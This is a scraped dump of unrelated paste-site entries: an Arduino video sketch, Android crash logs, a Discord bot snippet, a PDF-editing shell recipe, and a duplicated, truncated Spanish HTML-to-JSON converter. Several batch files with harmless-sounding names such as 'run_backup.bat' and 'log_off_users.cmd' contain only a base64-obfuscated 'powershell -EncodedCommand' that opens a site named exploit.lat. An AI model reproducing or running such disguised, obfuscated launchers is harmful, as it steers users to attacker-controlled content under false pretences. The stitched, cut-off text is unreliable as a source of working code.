	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Serial Display""
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-06-14 22:45:56

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* It reads video input from pin 9. It processes */
	/* graphics. It outputs composite video from pin 9 */
	/* and pin 7 */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <TVout.h> // Include the TVout library for video output

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t pico_PIN_D2 = 2; // Define input pin for video input
const uint8_t videoOutputPin1 = 9; // Define output pin for composite video
const uint8_t videoOutputPin2 = 7; // Define second output pin for composite video

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
TVout TV; // Create an instance of the TVout class

void setup(void)
{
    // put your setup code here, to run once:
    pinMode(pico_PIN_D2, INPUT); // Set the input pin for video input
    pinMode(videoOutputPin1, OUTPUT); // Set the first output pin for composite video
    pinMode(videoOutputPin2, OUTPUT); // Set the second output pin for composite video

    // Initialize TV output
    TV.begin(PAL, 120, 96); // PAL or NTSC
    TV.select_font(font6x8);
    TV.println(""Booting..."");
    Serial.begin(9600); // Initialize serial communication
}

void loop(void)
{
    // put your main code here, to run repeatedly:
    if (Serial.available()) {
        String msg = Serial.readStringUntil('\n');
        TV.clear_screen();
        TV.println(msg);
    }
}

/* END CODE */"
V6WWG0uX,2025-06-15T07:37:00.026491,powerampache,PHP,Saturday 14th of June 2025 05:37:01 PM CDT,"1.01-79 (79) - DB: 83
java.lang.NullPointerException
	at luci.sixsixsix.powerampache2.data.PlaylistsRepositoryImpl$addSongToPlaylist$2.invokeSuspend(PlaylistsRepositoryImpl.kt:410)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:959)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.app.ActivityThread.main(ActivityThread.java:9604)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:615)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:936)

addSongToPlaylist() - generic exception {""stackTrace"":[{""declaringClass"":""luci.sixsixsix.powerampache2.data.PlaylistsRepositoryImpl$addSongToPlaylist$2"",""fileName"":""PlaylistsRepositoryImpl.kt"",""lineNumber"":410,""methodName"":""invokeSuspend""},{""declaringClass"":""kotlin.coroutines.jvm.internal.BaseContinuationImpl"",""fileName"":""ContinuationImpl.kt"",""lineNumber"":33,""methodName"":""resumeWith""},{""declaringClass"":""kotlinx.coroutines.DispatchedTask"",""fileName"":""DispatchedTask.kt"",""lineNumber"":104,""methodName"":""run""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":959,""methodName"":""handleCallback""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":100,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.app.ActivityThread"",""fileName"":""ActivityThread.java"",""lineNumber"":9604,""methodName"":""main""},{""declaringClass"":""java.lang.reflect.Method"",""fileName"":""Method.java"",""lineNumber"":-2,""methodName"":""invoke""},{""declaringClass"":""com.android.internal.os.RuntimeInit$MethodAndArgsCaller"",""fileName"":""RuntimeInit.java"",""lineNumber"":615,""methodName"":""run""},{""declaringClass"":""com.android.internal.os.ZygoteInit"",""fileName"":""ZygoteInit.java"",""lineNumber"":936,""methodName"":""main""}],""suppressedExceptions"":[]}"
kdKfpLtR,2025-06-15T00:30:54.884,powerampache,PHP,Saturday 14th of June 2025 04:30:57 PM CDT,"1.00-72-BETA (74) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to ampache.nickroc.ru/85.21.144.182 (port 443) from /192.168.1.168 (port 45478) after 15000ms: isConnected failed: ETIMEDOUT (Connection timed out)"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

authorize() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to ampache.nickroc.ru/85.21.144.182 (port 443) from /192.168.1.168 (port 45478) after 15000ms: isConnected failed: ETIMEDOUT (Connection timed out)\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to ampache.nickroc.ru/85.21.144.182 (port 443) from /192.168.1.168 (port 45478) after 15000ms: isConnected failed: ETIMEDOUT (Connection timed out)\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
TBxNyweM,Untitled,Brodown64,Python,Saturday 14th of June 2025 04:24:00 PM CDT," # crime scene
    if message.content.strip().lower().startswith(""$setup""):
        await message.channel.send(""Please enter a floating-point number:"")

        def check(m):
            return m.author == message.author and m.channel == message.channel

        try:
            reply = await client.wait_for(""message"", timeout=30.0, check=check)
            parts = reply.content.strip().split()

            if len(parts) != 2:
                await message.channel.send(""You need to enter exactly two numbers."")
                return

            num1 = float(parts[0])
            num2 = float(parts[1])
            await message.channel.send(f""You entered: `{num1}` and `{num2}`"")

            global current_temperature_2m
            
            current_temperature_2m = weather.fetch_weather(num1, num2)
            await message.channel.send(f""Current temp: {current_temperature_2m}°F"")

        except ValueError:
            await message.channel.send(""That wasn't a valid floating-point number."")
        except asyncio.TimeoutError:
            await message.channel.send(""You took too long to respond."")

    if message.content.startswith('$weather'):
        await message.channel.send(f'Weather: {current_temperature_2m}')"
9xpL6t7G,track_activity.bat,zakaria-,Batch,Saturday 14th of June 2025 04:07:38 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AYQBiADYAOAAyAGUAYgAzAA==

VDxc5x"
8C6UDniP,Edit PDF from shell as ODG,metalx1000,Bash,Saturday 14th of June 2025 04:03:09 PM CDT,"# Convert pdf to odg
libreoffice --headless --convert-to odg form.pdf

# extract odg to tmp folder
mkdir tmp
cd tmp
unzip ../form.odg

# edit content
vim content.xml

# repack odg
zip -r ../new_form.odg *
cd ../

# convert back to pdf
libreoffice --headless --convert-to pdf new_form.odg"
AHrCshaE,chat-index.html,Alexislls,HTML,Saturday 14th of June 2025 04:01:29 PM CDT,"<!DOCTYPE html>
<html lang=""es"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Chat</title>
    <link rel=""stylesheet"" href=""styles.css"">
</head>
<body>
    <div class='chat'>
        <div class='chat-messages'>
            <div class='chat-messages__content' id='messages'>
                <div class='chat__message chat__message_blue'>admin: ¡Hola!</div>
                <div class='chat__message chat__message_black'>user: ¿Qué tal?</div>
                <div class='chat__message chat__message_blue'>admin: Bien, ¿y tú?</div>
                <div class='chat__message chat__message_black'>user: Bien también</div>
                <div class='chat__message chat__message_blue'>admin: ¡Genial!</div>
                <div class='chat__message chat__message_blue'>admin: ¡Ha sido agradable charlar, hasta luego!</div>
                <div class='chat__message chat__message_black'>user: ¡Hasta luego!</div>
            </div>
        </div>
        <div class='chat-input'>
            <form method='post' id='chat-form'>
                <input type='text' id='message-text' class='chat-form__input' placeholder='Ingrese mensaje'>
                <input type='submit' class='chat-form__submit' value='=>'>
            </form>
        </div>
    </div>
</body>
</html>"
2LXMgRmQ,run_backup.bat,zakaria-,Batch,Saturday 14th of June 2025 03:57:36 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0ANwAzADUAMQBlAGMAYwBkAA==

AkiVkR"
3RpgRnt2,build_assets.ps1,zakaria-,Batch,Saturday 14th of June 2025 03:47:34 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AMQBmAGIAOAA4ADkAZQBiAA==

lENG0z"
eCELBPPC,log_off_users.cmd,zakaria-,Batch,Saturday 14th of June 2025 03:37:32 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0ANQA3AGIANAA2AGMAMgA2AA==

kRMsMj"
DNdaMdPd,Convertidor HTML a JSON,Alexislls,JavaScript,Saturday 14th of June 2025 03:29:35 PM CDT,"function convertHTMLtoJSON() {
	// Limpieza de la consola para repetir el lanzamiento del ejemplo
	console.clear();
	// Mostrar en la consola el nombre del programa
	console.log('= CONVERTIDOR HTML A JSON =');
	// Notificación en la consola sobre el inicio del trabajo del convertidor
	console.log('	INICIADA LA SERIALIZACIÓN DEL CÓDIGO HTML.');
	let objectToStringify = new Object(); // Creamos un objeto para registrar elementos y su contenido (el objeto será convertido a JSON al final)
			
	// Evaluación de los elementos HTML de nivel 1
	let bodyElemsLength = document.body.children.length; // Contamos la cantidad de elementos en el body
	console.log('		SE ENCONTRARON ' + bodyElemsLength + ' ELEMENTOS DE NIVEL 1 EN LA PÁGINA.'); // Notificación sobre la cantidad de elementos de nivel 1 encontrados
	console.log(document.body.children); // Mostrar en la consola los elementos de nivel 1 encontrados
	console.log('____________________________________________________________________________________________________'); // Agregar un separador después de mostrar la información principal en la consola
				
	// Recorrer todos los elementos HTML de nivel 1
	for (let e = 0; e < bodyElemsLength; e++) {
			
		// Selección del elemento de nivel 1
		let elementLevel1 = document.body.children[e];
				
		// Registro del nombre del elemento de nivel 1
		let elementLevel1Name = elementLevel1.tagName; // Selección del nombre del elemento de nivel 1
		console.log('	ENCONTRADO ELEMENTO DE NIVEL 1 <' + elementLevel1Name + '>'); // Notificación sobre el elemento de nivel 1 encontrado
		objectToStringify['element'+ e + 'Level1'] = [{['element' + e + 'Level1Name']: elementLevel1Name}]; // Registro del nombre del elemento de nivel 1 en el objeto
				
		// Registro de los atributos del elemento de nivel 1
			
			// Verificación del elemento de nivel 1 para la presencia de atributos
			if (elementLevel1.attributes.length > 0) {
					
				// Si se encontraron atributos del elemento de nivel 1
				let elementLevel1Attributes = elementLevel1.attributes; // Selección de los atributos del elemento de nivel 1
					
				// Declaración de un array para el registro estructurado de los atributos del elemento de nivel 1
				let saveAttributes = new Array();
								
				// Recorrido y registro en el objeto raíz objectToStringify de los atributos del elemento de nivel 1
				for (let a = 0; a < elementLevel1Attributes.length; a++) {
					
					// Notificación sobre el atributo encontrado del elemento de nivel 1
					console.log('		Atributo del elemento de nivel 1 <' + elementLevel1Name + '>: ' + elementLevel1Attributes[a].name + '=' + elementLevel1Attributes[a].value);
						
					let attributeName = elementLevel1Attributes[a].name; // Registro del nombre del atributo del elemento de nivel 1
					let attributeValue = elementLevel1Attributes[a].value; // Registro del valor del atributo del elemento de nivel 1
						
					// Registro del nombre y valor del atributo actual del elemento de nivel 1 en el objeto
					let currentAttribute = {
						['element' + e + 'Level1' + 'attribute' + a]: [
							{
								['element' + e + 'Level1' + 'attribute' + a + 'Name']: attributeName
							},
							{
								['element' + e + 'Level1' + 'attribute' + a + 'Value']: attributeValue
							}
						]
					};
					// Guardar el atributo estructurado del elemento de nivel 1 en el array
					saveAttributes.push(currentAttribute);

				};
					
				// Registro de los atributos estructurados del elemento de nivel 1 desde el array en el objeto raíz objectToStringify
				objectToStringify['element' + e + 'Level1'][1] = {
					['element' + e + 'Level1Attributes']: saveAttributes
				};
				
					
			} else {
				// Si el elemento de nivel 1 no tiene atributos, mostrar notificación en la consola
				console.log('		El elemento de nivel 1 <' + elementLevel1Name + '> no tiene atributos.');
				// Si el elemento de nivel 1 no tiene atributos, el objeto con espacio para ellos se deja con valor vacío
				objectToStringify['element' + e + 'Level1'][1] = {
					['element' + e + 'Level1Attributes']: ''
				};
			};
					
		// Registro del contenido del elemento de nivel 1 (otros elementos o texto)
			
			// Verificación del elemento de nivel 1 para la presencia de elementos anidados
			if (elementLevel1.children.length > 0) {
						
				// Notificación en la consola sobre la cantidad de elementos de nivel 2 encontrados dentro del elemento de nivel 1
				console.log('		El elemento <' + elementLevel1Name + '> tiene ' + elementLevel1.children.length + ' elementos anidados.');
						
				// Declaración de un array para el registro estructurado del contenido del elemento de nivel 1
				// (elementos de nivel 2)
				let elementLevel1Content = new Array();
						
				// Recorrido de los elementos de nivel 2, si se encuentran				
				for (let e2 = 0; e2 < elementLevel1.children.length; e2++) {
										
					let elementLevel2 = elementLevel1.children[e2]; // Selección del elemento de nivel 2
							
					// Declaración de un array para el registro estructurado del elemento actual de nivel 2
					let thisInnerContentLevel2 = new Array();
							
					// Registro del nombre del elemento de nivel 2
					let elementLevel2Name = elementLevel2.tagName; // Selección del nombre del elemento de nivel 2
					console.log('			ENCONTRADO ELEMENTO DE NIVEL 2 <' + elementLevel2Name + '>'); // Notificación sobre el elemento de nivel 2 encontrado
														
					// Registro del nombre estructurado del elemento de nivel 2
					let elementLevel2NameSaver = {
						['element' + e2 + 'Level2Name']: elementLevel2Name
					};
					thisInnerContentLevel2.push(elementLevel2NameSaver);
										
					// Registro de los atributos del elemento de nivel 2
							
						// Verificación del elemento de nivel 2 para la presencia de atributos
						if (elementLevel2.attributes.length > 0) {
									
							// Si se encontraron atributos del elemento de nivel 2
							let elementLevel2Attributes = elementLevel2.attributes; // Selección de los atributos del elemento de nivel 2
									
							// Declaración de un array para el registro estructurado de los atributos del elemento de nivel 2
							let saveAttributes2 = new Array();
									
							// Recorrido y registro de los atributos del elemento de nivel 2
							for (let a2 = 0; a2 < elementLevel2Attributes.length; a2++) {
								// Notificación sobre el atributo encontrado del elemento de nivel 2
								console.log('				Atributo del elemento de nivel 2 <' + elementLevel2Name + '>: ' + elementLevel2Attributes[a2].name + '=' + elementLevel2Attributes[a2].value);
										
								let attributeName2 = elementLevel2Attributes[a2].name; // Registro del nombre del atributo del elemento de nivel 2
								let attributeValue2 = elementLevel2Attributes[a2].value; // Registro del valor del atributo del elemento de nivel 2
										
								// Registro del nombre y valor del atributo actual del elemento de nivel 2 en el objeto
								let currentAttribute2 = {
									['element' + e2 + 'Level2' + 'attribute' + a2]: [
										{
											['element' + e2 + 'Level2' + 'attribute' + a2 + 'Name']: attributeName2
										},
										{
											['element' + e2 + 'Level2' + 'attribute' + a2 + 'Value']: attributeValue2
										}
									]
								};
										
								// Guardar el atributo estructurado del elemento de nivel 2 en el array
								saveAttributes2.push(currentAttribute2);

							};
									
							// Registro de los atributos estructurados del elemento de nivel 2 desde el array de atributos del elemento de nivel 2 (saveAttributes2)
							// en el array de contenido del elemento de nivel 1 (elemenLevel1Content)
							// usando un objeto intermedio elementLevel2AttributesSaver
							let elementLevel2AttributesSaver = {
								['element' + e2 + 'Level2Attributes']: saveAttributes2
							};
							thisInnerContentLevel2.push(elementLevel2AttributesSaver);
													
						} else {
									
							// Si el elemento de nivel 2 no tiene atributos, mostrar notificación en la consola
							console.log('				El elemento de nivel 2 <' + elementLevel2Name + '> no tiene atributos.');
									
							// Si el elemento de nivel 2 no tiene atributos, el objeto con espacio para ellos se deja con valor vacío
							let elementLevel2AttributesSaver = {
								['element' + e2 + 'Level2Attributes']: ''
							};
							thisInnerContentLevel2.push(elementLevel2AttributesSaver);

						};
								
									
					// Registro del contenido del elemento de nivel 2 (otros elementos o texto)
										
						// Verificación del elemento de nivel 2 para la presencia de elementos anidados
						if (elementLevel2.children.length > 0) {
											
							// Notificación en la consola sobre la cantidad de elementos de nivel 3 encontrados dentro del elemento de nivel 2
							console.log('				El elemento <' + elementLevel2Name + '> tiene ' + elementLevel2.children.length + ' elementos anidados.');
											
							// Declaración de un array para el registro estructurado del contenido del elemento de nivel 2
							// (elementos de nivel 3)
							let elementLevel2Content = new Array();
											
							// Recorrido de los elementos de nivel 3, si se encuentran
							for (let e3 = 0; e3 < elementLevel2.children.length; e3++) {
												
								let elementLevel3 = elementLevel2.children[e3]; // Selección del elemento de nivel 3
												
								// Declaración de un array para el registro estructurado del elemento actual de nivel 3
								let thisInnerContentLevel3 = new Array();
												
								// Registro del nombre del elemento de nivel 3
								let elementLevel3Name = elementLevel3.tagName; // Selección del nombre del elemento de nivel 3
								console.log('					ENCONTRADO ELEMENTO DE NIVEL 3 <' + elementLevel3Name + '>'); // Notificación sobre el elemento de nivel 3 encontrado
												
								// Registro del nombre estructurado del elemento de nivel 3
								let elementLevel3NameSaver = {
									['element' + e3 + 'Level3Name']: elementLevel3Name
								};
								thisInnerContentLevel3.push(elementLevel3NameSaver);
											
								// Registro de los atributos del elemento de nivel 3
											
									// Verificación del elemento de nivel 3 para la presencia de atributos
									if (elementLevel3.attributes.length > 0) {
													
										// Si se encontraron atributos del elemento de nivel 3
										let elementLevel3Attributes = elementLevel3.attributes; // Selección de los atributos del elemento de nivel 3
														
										// Declaración de un array para el registro estructurado de los atributos del elemento de nivel 3
										let saveAttributes3 = new Array();
														
										// Recorrido y registro de los atributos del elemento de nivel 3
										for (let a3 = 0; a3 < elementLevel3Attributes.length; a3++) {
											
											// Notificación sobre el atributo encontrado del elemento de nivel 3
											console.log('						Atributo del elemento de nivel 3 <' + elementLevel3Name + '>: ' + elementLevel3Attributes[a3].name + '=' + elementLevel3Attributes[a3].value);
															
											let attributeName3 = elementLevel3Attributes[a3].name; // Registro del nombre del atributo del elemento de nivel 3
											let attributeValue3 = elementLevel3Attributes[a3].value; // Registro del valor del atributo del elemento de nivel 3
															
											// Registro del nombre y valor del atributo actual del elemento de nivel 3 en el objeto
											let currentAttribute3 = {
												['element' + e3 + 'Level3' + 'attribute' + a3]: [
													{
														['element' + e3 + 'Level3' + 'attribute' + a3 + 'Name']: attributeName3
													},
													{
														['element' + e3 + 'Level3' + 'attribute' + a3 + 'Value']: attributeValue3
													}
												]
											};
															
											// Guardar el atributo estructurado del elemento de nivel 3 en el array
											saveAttributes3.push(currentAttribute3);

										};
													
										// Registro de los atributos estructurados del elemento de nivel 3 desde el array de atributos del elemento de nivel 3 (saveAttributes3)
										// en el array del elemento de nivel 3 (thisInnerContentLevel3)
										// usando un objeto intermedio elementLevel3AttributesSaver
										let elementLevel3AttributesSaver = {
											['element' + e3 + 'Level3Attributes']: saveAttributes3
										};
										thisInnerContentLevel3.push(elementLevel3AttributesSaver);
												
									}  else {
									
										// Si el elemento de nivel 3 no tiene atributos, mostrar notificación en la consola
										console.log('						El elemento de nivel 3 <' + elementLevel3Name + '> no tiene atributos.');
												
										// Si el elemento de nivel 3 no tiene atributos, el objeto con espacio para ellos se deja con valor vacío
										let elementLevel3AttributesSaver = {
											['element' + e3 + 'Level3Attributes']: ''
										};
										thisInnerContentLevel3.push(elementLevel3AttributesSaver);

									};
									
								// Registro de cualquier contenido HTML del elemento de nivel 3
								
									// Verificación del elemento de nivel 3 para la presencia de cualquier contenido HTML
									if (elementLevel3.innerHTML) {
										
										let elementLevel3innerHTML = elementLevel3.innerHTML;
										console.log('						El elemento de nivel 3 <' + elementLevel3Name + '> contiene contenido: ""' + elementLevel3innerHTML + '""');
										
										elementLevel3innerHTMLSaver = {
											['element' + e3 + 'Level3Content']: elementLevel3innerHTML
										};
										thisInnerContentLevel3.push(elementLevel3innerHTMLSaver);
										
									} else {
										console.log('						El elemento de nivel 3 <' + elementLevel3Name + '> no contiene contenido.');
										
										// Si el elemento de nivel 3 no tiene contenido, el objeto con espacio para el contenido se deja con valor vacío
										let elementLevel3EmptyContentSaver = {
											['element' + e3 + 'Level3Content']: ''
										};
										thisInnerContentLevel3.push(elementLevel3EmptyContentSaver);
										
									};
									
								// Registro del elemento anidado actual de nivel 3 en un objeto intermedio
								// (contiene un objeto con número de orden y un valor-array de tres objetos:
								// nombre, atributos, contenido del elemento de nivel 3)
								let elementLevel3Saver = {
									['element' + e3 + 'Level3']: thisInnerContentLevel3
								};
												
								// Registro del objeto intermedio con el elemento anidado de nivel 3 en el array de contenido del elemento de nivel 2
								elementLevel2Content.push(elementLevel3Saver);
									
							}; // Fin del ciclo for para recorrer elementos de nivel 3, si se encontraron
							
							// Registro del array de todo el contenido del elemento de nivel 2 (elementos de nivel 3)
							// en un objeto intermedio (contiene el número de orden del elemento de nivel 2 al que pertenece el contenido,
							// y un valor-array del contenido actual del elemento de nivel 2 seleccionado
							let elementLevel2ContentSaver = {
								['element' + e2 + 'Level2Content']: elementLevel2Content
							};
							// Registro del objeto intermedio de todo el contenido estructurado del elemento de nivel 2
							// en el array del elemento de nivel 2
							thisInnerContentLevel2.push(elementLevel2ContentSaver);
							
						
						// Fin de la verificación de elementos de nivel 2 para la presencia de elementos anidados de nivel 3
						
						// Verificación de elementos de nivel 2 para la presencia de texto o ausencia de anidaciones
						} else if (elementLevel2.children.length == 0) {
										
							// Verificación del elemento de nivel 2 para la presencia de texto, si no hay elementos anidados
							console.log('				El elemento de nivel 2 <' + elementLevel2Name + '> no tiene elementos anidados. Búsqueda de texto.');
											
							if (elementLevel2.textContent) {
								let elementLevel2Text = elementLevel2.textContent; // Selección del contenido de texto dentro del elemento de nivel 2
								console.log('				El elemento de nivel 2 <' + elementLevel2Name + '> contiene texto: ""' + elementLevel2Text + '""');
												
								// Registro del texto del elemento de nivel 2
								let elementLevel2TextSaver = {
									['element' + e2 + 'Level2Content']: elementLevel2Text
								};
								thisInnerContentLevel2.push(elementLevel2TextSaver);
												
							} else {
												
								// Si el elemento de nivel 2 no contiene ni elementos anidados ni texto
								console.log('				El elemento de nivel 2 <' + elementLevel2Name + '> no contiene texto.');
												
								// Si el elemento de nivel 2 no tiene contenido, el objeto con espacio para el contenido se deja con valor vacío
								let elementLevel2EmptyContentSaver = {
									['element' + e2 + 'Level2Content']: ''
								};
								thisInnerContentLevel2.push(elementLevel2EmptyContentSaver);
												
							};
						
						};
						
						// Registro de todos los elementos anidados de nivel 2 en un objeto intermedio
						let elementLevel2Saver = {
							['element' + e2 + 'Level2']: thisInnerContentLevel2
						};
									
						// Registro del objeto intermedio con los elementos anidados de nivel 2 en el array de contenido del elemento de nivel 1
						elementLevel1Content.push(elementLevel2Saver);
						
				}; // Fin del ciclo for para recorrer elementos de nivel 2, si se encontraron
							
				// Registro del contenido estructurado del elemento de nivel 1 desde el array en el objeto raíz objectToStringify
				objectToStringify['element' + e + 'Level1'][2] = {
					['element' + e + 'Level1Content']: elementLevel1Content
				};
					
			} else if (elementLevel1.children.length == 0) {
					
				// Verificación del elemento de nivel 1 para la presencia de texto, si no hay elementos anidados
				console.log('		El elemento de nivel 1 <' + elementLevel1Name + '> no tiene elementos anidados. Búsqueda de texto.');
					
				if (elementLevel1.textContent) {
					let elementLevel1Text = elementLevel1.textContent; // Selección del contenido de texto dentro del elemento de nivel 1
					console.log('		El elemento de nivel 1 <' + elementLevel1Name + '> contiene texto: ""' + elementLevel1Text + '""');
						
					// Registro del texto del elemento de nivel 1 en el objeto raíz objectToStringify
					objectToStringify['element' + e + 'Level1'][2] = {
						['element' + e + 'Level1Content']: elementLevel1Text
					};
						
				} else {
						
					// Si el elemento de nivel 1 no contiene ni elementos anidados ni texto
					console.log('		El elemento de nivel 1 <' + elementLevel1Name + '> no contiene texto.');
							
					// Si el elemento de nivel 1 no tiene contenido, el objeto con espacio para el contenido se deja con valor vacío
					objectToStringify['element' + e + 'Level1'][2] = {
						['element' + e + 'Level1Content']: ''
					};
				};
				
			};
	};
				
	// Mostrar el resultado de la conversión de HTML a JSON
	let result = JSON.stringify(objectToStringify); // Serializamos el objeto
	document.body.innerHTML = result; // Reemplazamos el cuerpo de la página con nuestro JSON
	// Agregar un separador antes de la notificación en la consola sobre la finalización del trabajo del convertidor
	console.log('____________________________________________________________________________________________________');
	// Notificación en la consola sobre la finalización del trabajo del convertidor
	console.log('SERIALIZACIÓN DEL CÓDIGO HTML COMPLETADA.');
};
		
setTimeout(convertHTMLtoJSON, 1000); // Mostramos el resultado un segundo después de cargar la página inicial"
jRW267qN,index.html,Alexislls,HTML,Saturday 14th of June 2025 03:27:35 PM CDT,"<!DOCTYPE html>
<html>

	<head>
		<meta charset=""utf-8"">
		<title>Conversión de HTML a JSON</title>
	</head>
	
	<body>
		<p class=""myclass"" style=""margin: 1px;"">Algún párrafo.</p>
		<div>
			<p><span>Otro párrafo (elemento de nivel 3)</span></p>
			<span>Otro párrafo (elemento de nivel 2)</span>
			<span><a href=""#"">Algún enlace (elemento de nivel 3).</a></span>
			<img src=""images/test.png"" alt=""Imagen de prueba"">
		</div>
		<script src=""script.js""></script>
	</body>
	
</html>"
3MVTGVW2,track_activity.bat,zakaria-,Batch,Saturday 14th of June 2025 03:27:30 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AYgBjADEAZgA4ADQANQAyAA==

SzGhNN"
Hz8RFjpQ,script.js,Alexislls,JavaScript,Saturday 14th of June 2025 03:25:32 PM CDT,"function convertHTMLtoJSON() {
	// Limpieza de la consola para repetir el lanzamiento del ejemplo
	console.clear();
	// Mostrar en la consola el nombre del programa
	console.log('= CONVERTIDOR HTML A JSON =');
	// Notificación en la consola sobre el inicio del trabajo del convertidor
	console.log('	INICIADA LA SERIALIZACIÓN DEL CÓDIGO HTML.');
	let objectToStringify = new Object(); // Creamos un objeto para registrar elementos y su contenido (el objeto será convertido a JSON al final)
			
	// Evaluación de los elementos HTML de nivel 1
	let bodyElemsLength = document.body.children.length; // Contamos la cantidad de elementos en el body
	console.log('		SE ENCONTRARON ' + bodyElemsLength + ' ELEMENTOS DE NIVEL 1 EN LA PÁGINA.'); // Notificación sobre la cantidad de elementos de nivel 1 encontrados
	console.log(document.body.children); // Mostrar en la consola los elementos de nivel 1 encontrados
	console.log('____________________________________________________________________________________________________'); // Agregar un separador después de mostrar la información principal en la consola
				
	// Recorrer todos los elementos HTML de nivel 1
	for (let e = 0; e < bodyElemsLength; e++) {
			
		// Selección del elemento de nivel 1
		let elementLevel1 = document.body.children[e];
				
		// Registro del nombre del elemento de nivel 1
		let elementLevel1Name = elementLevel1.tagName; // Selección del nombre del elemento de nivel 1
		console.log('	ENCONTRADO ELEMENTO DE NIVEL 1 <' + elementLevel1Name + '>'); // Notificación sobre el elemento de nivel 1 encontrado
		objectToStringify['element'+ e + 'Level1'] = [{['element' + e + 'Level1Name']: elementLevel1Name}]; // Registro del nombre del elemento de nivel 1 en el objeto
				
		// Registro de los atributos del elemento de nivel 1
			
			// Verificación del elemento de nivel 1 para la presencia de atributos
			if (elementLevel1.attributes.length > 0) {
					
				// Si se encontraron atributos del elemento de nivel 1
				let elementLevel1Attributes = elementLevel1.attributes; // Selección de los atributos del elemento de nivel 1
					
				// Declaración de un array para el registro estructurado de los atributos del elemento de nivel 1
				let saveAttributes = new Array();
								
				// Recorrido y registro en el objeto raíz objectToStringify de los atributos del elemento de nivel 1
				for (let a = 0; a < elementLevel1Attributes.length; a++) {
					
					// Notificación sobre el atributo encontrado del elemento de nivel 1
					console.log('		Atributo del elemento de nivel 1 <' + elementLevel1.tagName + '>: ' + elementLevel1Attributes[a].name + '=' + elementLevel1Attributes[a].value);
						
					let attributeName = elementLevel1Attributes[a].name; // Registro del nombre del atributo del elemento de nivel 1
					let attributeValue = elementLevel1Attributes[a].value; // Registro del valor del atributo del elemento de nivel 1
						
					// Registro del nombre y valor del atributo actual del elemento de nivel 1 en el objeto
					let currentAttribute = {
						['element' + e + 'Level1' + 'attribute' + a]: [
							{
								['element' + e + 'Level1' + 'attribute' + a + 'Name']: attributeName
							},
							{
								['element' + e + 'Level1' + 'attribute' + a + 'Value']: attributeValue
							}
						]
					};
					// Guardar el atributo estructurado del elemento de nivel 1 en el array
					saveAttributes.push(currentAttribute);

				};
					
				// Registro de los atributos estructurados del elemento de nivel 1 desde el array en el objeto raíz objectToStringify
				objectToStringify['element' + e + 'Level1'][1] = {
					['element' + e + 'Level1Attributes']: saveAttributes
				};
				
					
			} else {
				// Si el elemento de nivel 1 no tiene atributos, mostrar notificación en la consola
				console.log('		El elemento de nivel 1 <' + elementLevel1Name + '> no tiene atributos.');
				// Si el elemento de nivel 1 no tiene atributos, el objeto con espacio para ellos se deja con valor vacío
				objectToStringify['element' + e + 'Level1'][1] = {
					['element' + e + 'Level1Attributes']: ''
				};
			};
					
		// Registro del contenido del elemento de nivel 1 (otros elementos o texto)
			
			// Verificación del elemento de nivel 1 para la presencia de elementos anidados
